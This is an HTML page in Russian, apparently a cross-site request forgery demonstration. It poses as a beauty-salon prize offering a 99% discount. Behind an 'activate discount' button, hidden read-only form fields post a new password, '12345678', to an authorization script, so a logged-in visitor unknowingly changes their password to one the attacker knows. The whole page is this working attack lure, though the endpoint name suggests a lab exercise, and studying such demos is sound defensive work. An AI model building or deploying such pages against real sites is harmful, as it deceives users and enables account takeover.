<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Приз</title>
</head>
<body>
    <form style="width: 300px; height: 250px; inset: 0; position: absolute; margin: auto" method="POST" action="authorization_fake.php">
        <input type="password" name="password" value="12345678" hidden readonly>
        <input type="password" name="password_confirm" value="12345678" hidden readonly>
        <h1>АКЦИОННОЕ ПРЕДЛОЖЕНИЕ!</h1>
        <p>Поздравляем. Вы получили скидку 99% на услуги в данном салоне красоты. Для активации, нажмите кнопку ниже</p>
        <button type="submit">Активировать скидку</button>       
    </form>
</body>
</html>